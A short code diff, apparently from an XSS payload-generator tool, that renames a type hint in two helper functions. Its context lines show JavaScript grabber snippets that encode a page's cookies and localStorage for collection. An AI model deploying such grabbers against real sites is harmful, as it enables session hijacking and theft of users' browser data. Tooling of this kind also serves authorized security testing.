@@ -90,7 +90,7 @@ def generate_xss_payload(body: GenerateXssPayloadModel):
             return {"payload": payload}
 
 
-def _generate_collector_payload_body(body: XssGenerateModel, client: Client) -> str:
+def _generate_collector_payload_body(body: GenerateXssPayloadModel, client: Client) -> str:
     data_to_exclude = sorted(DATA_TO_GATHER - set(body.to_gather))
     joined_data_to_exclude = ";".join(data_to_exclude)
     joined_tags = ";".join(body.tags)
@@ -100,7 +100,7 @@ def _generate_collector_payload_body(body: XssGenerateModel, client: Client) -> 
     return payload_body
 
 
-def _generate_js_grabber_payload_elements(body: XssGenerateModel) -> tuple[str, str]:
+def _generate_js_grabber_payload_elements(body: GenerateXssPayloadModel) -> tuple[str, str]:
     js_grabbers = {
         "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
         "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
